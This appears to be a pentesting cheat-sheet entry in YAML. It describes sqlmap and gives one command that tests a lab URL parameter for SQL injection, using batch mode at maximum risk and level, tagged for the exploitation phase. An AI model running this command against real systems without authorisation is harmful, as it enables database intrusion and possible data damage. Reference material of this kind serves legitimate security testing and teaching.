---
description: |
  sqlmap is an automated SQL injection detection and exploitation tool that tests URL parameters, forms, headers, and cookies for injectable database queries across MySQL, MSSQL, PostgreSQL, Oracle, and other backends. The following command tests a GET parameter for injection, running in non-interactive batch mode so it accepts all default prompts automatically, making it ideal for scripted or unattended enumeration.

  Command Reference:

  	Target URL: http://10.10.10.1/page.php?id=1

command: |
  sqlmap -u "http://10.10.10.1/page.php?id=1" --batch --risk=3 --level=5
items:
  - No_Creds
services:
  - Web
OS:
  - Linux
phases:
  - Exploitation
references:
  - https://github.com/sqlmapproject/sqlmap
  - https://github.com/sqlmapproject/sqlmap/wiki/Usage
---
